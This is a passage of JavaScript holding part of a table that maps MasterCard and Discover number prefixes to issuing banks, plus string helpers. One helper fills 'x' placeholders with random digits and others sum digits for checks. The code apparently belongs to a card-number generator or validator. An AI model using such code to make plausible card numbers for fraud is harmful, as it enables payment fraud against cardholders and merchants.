    cd[i] = "MasterCard-Eurocard Ab";
    i++;
    c[i] = "5227xxxxxxxxxxxx";
    cd[i] = "MasterCard-Rocky Mountain Bankcard System Inc.";
    i++;
    c[i] = "5228xxxxxxxxxxxx";
    cd[i] = "MasterCard-First Union National Bank of North Carolina";
    i++;
    c[i] = "5229xxxxxxxxxxxx";
    cd[i] = "MasterCard-Sunwest Bank of Albuquerque N.A.";
    i++;
    c[i] = "5230xxxxxxxxxxxx";
    cd[i] = "MasterCard-Harris Trust & Savings Bank";
    i++;
    c[i] = "5231xxxxxxxxxxxx";
    cd[i] = "MasterCard-Badische Beamtenbank EG";
    i++;
    c[i] = "5232xxxxxxxxxxxx";
    cd[i] = "MasterCard-Eurocard Deutschland";
    i++;
    c[i] = "5233xxxxxxxxxxxx";
    cd[i] = "MasterCard-Computer Systems Association Inc.";
    i++;
    c[i] = "5234xxxxxxxxxxxx";
    cd[i] = "MasterCard-Citibank Arizona";
    i++;
    c[i] = "5235xxxxxxxxxxxx";
    cd[i] = "MasterCard-Financial Transaction System Inc.";
    i++;
    c[i] = "5236xxxxxxxxxxxx";
    cd[i] = "MasterCard-First Tennessee Bank N.A.";
    i++;
    c[i] = "5254xxxxxxxxxxxx";
    cd[i] = "MasterCard-Bank of America";
    i++;
    c[i] = "5273xxxxxxxxxxxx";
    cd[i] = "MasterCard(can be Gold)-Bank of America";
    i++;
    c[i] = "5286xxxxxxxxxxxx";
    cd[i] = "MasterCard-Home Federal";
    i++;
    c[i] = "5291xxxxxxxxxxxx";
    cd[i] = "MasterCard-Signet Bank";
    i++;
    c[i] = "5329xxxxxxxxxxxx";
    cd[i] = "MasterCard-Maryland of North America";
    i++;
    c[i] = "533875xxxxxxxxxx";
    cd[i] = "MasterCard Prepaid-PayPal / Lottomaticard (Italy)";
    i++;
    c[i] = "5410xxxxxxxxxxxx";
    cd[i] = "MasterCard-Wells Fargo";
    i++;
    c[i] = "5412xxxxxxxxxxxx";
    cd[i] = "MasterCard-Wells Fargo";
    i++;
    c[i] = "5419xxxxxxxxxxxx";
    cd[i] = "MasterCard-Bank of Hoven";
    i++;
    c[i] = "5424xxxxxxxxxxxx";
    cd[i] = "MasterCard-Citibank/Citicorp";
    i++;
    c[i] = "543013xxxxxxxxxx";
    cd[i] = "MasterCard-BNL/BNP Paribas (Italy)";
    i++;
    c[i] = "5434xxxxxxxxxxxx";
    cd[i] = "MasterCard-National Westminster Bank";
    i++;
    c[i] = "5465xxxxxxxxxxxx";
    cd[i] = "MasterCard-Chase Manhattan";
    i++;
    c[i] = "52550114xxxxxxxx";
    cd[i] = "MasterCard-Banco di Sardegna (Italy)";
    i++;
    c[i] = "530693xxxxxxxxxx";
    cd[i] = "MasterCard-Bancolombia Cadenalco (Colombia)";
    i++;
    c[i] = "5406251xxxxxxxxx";
    cd[i] = "MasterCard-Banco de Occidente (Colombia)";
    i++;
    c[i] = "5426xxxxxxxxxxxx";
    cd[i] = "MasterCard-Granahorrar (Colombia)";
    i++;
    c[i] = "5406xxxxxxxxxxxx";
    cd[i] = "MasterCard-Granahorrar (Colombia)";
    i++;
    c[i] = "581149xxxxxxxxxx";
    cd[i] = "Maestro-BNL/BNP Paribas (Italy)";
    i++;
    c[i] = "5xxxxxxxxxxxxxxx";
    cd[i] = "MasterCard";
    i++;
    c[i] = "6013xxxxxxxxxxxx";
    cd[i] = "Discover-MBNA Bank";
    i++;
    c[i] = "60xxxxxxxxxxxxxx";
    cd[i] = "Discover";
    i++;
    mxcards = i - 1;
}

function leftS(aS, n) {
    aS += "";
    var rS = "";
    if (n >= 1) rS = aS.substring(0, n);
    return rS;
}

function rightS(aS, n) {
    aS += "";
    var rS = "";
    if (n >= 1) rS = aS.substring(aS.length - n, aS.length);
    return rS;
}

function midS(aS, n, n2) {
    aS += "";
    var rS = "";
    if (n2 == null || n2 == "") n2 = aS.length;
    n *= 1;
    n2 *= 1;
    if (n < 0) n++;
    rS = aS.substring(n - 1, n - 1 + n2);
    return rS;
}

function linstr(aS, bS) {
    aS += "";
    bS += "";
    var r = false;
    if (leftS(aS, bS.length) == bS) r = true;
    return r;
}

function sbtString(s1, s2) {
    var ous = "";
    s1 += "";
    s2 += "";
    for (var i = 1; i <= s1.length; i++) {
        var c1 = s1.substring(i - 1, i);
        var c2 = s2.indexOf(c1);
        if (c2 == -1) ous += c1;
    }
    return ous;
}

function sbtStringSpRnd(s1, s2, bS) {
    if (bS == null || bS == "") {
        bS = "0123456789";
    }
    var ous = "";
    bS += "";
    for (var i = 1; i <= s1.length; i++) {
        var c1 = s1.substring(i - 1, i);
        var c2 = s2.indexOf(c1);
        if (c2 == -1) ous += c1;
        else ous += midS(bS, Math.floor(Math.random() * (bS.length - 1)) + 1, 1);
    }
    return ous;
}

function cmpPattern(a, p, x) {
    if (x == "" || x == null) x = "x";
    if (x == "X") x = "x";
    x = "" + x.substring(0, 1);
    a += "";
    p += "";
    r = false;
    mc = 0;
    if (a.length == p.length) {
        for (var i = 1; i <= a.length; i++) {
            a1 = midS(a, i, 1);
            p1 = midS(p, i, 1);
            if (a1 == p1 || p1 == x) mc++;
        }
    }
    if (mc == a.length) r = true;
    return r;
}

function isdiv(a, b) {
    if (b == null) b = 2;
    a *= 1.0;
    b *= 1.0;
    var r = false;
    if (a / b == Math.floor(a / b)) r = true;
    return r;
}

function sumDigits(n, m) {
    if (m == 0 || m == null) m = 1;
    n += "";
    if (m > 0) {
        while (n.length > m) {
            var r = 0;
            for (var i = 1; i <= n.length; i++) {
                r += 1.0 * midS(n, i, 1);
            }
            n = "" + r;
        }
    } else {
        for (var j = 1; j <= Math.abs(m); j++) {
            var r = 0;
            for (var i = 1; i <= n.length; i++) {
                r += 1.0 * midS(n, i, 1);
            }
            n = "" + r;
        }
    }
    r = n;
    return r;
}

function makeArray(n) {
    this.length = n;
    for (var i = 1; i <= n; i++) {
        this[i] = 0;
    }
    return this;
}
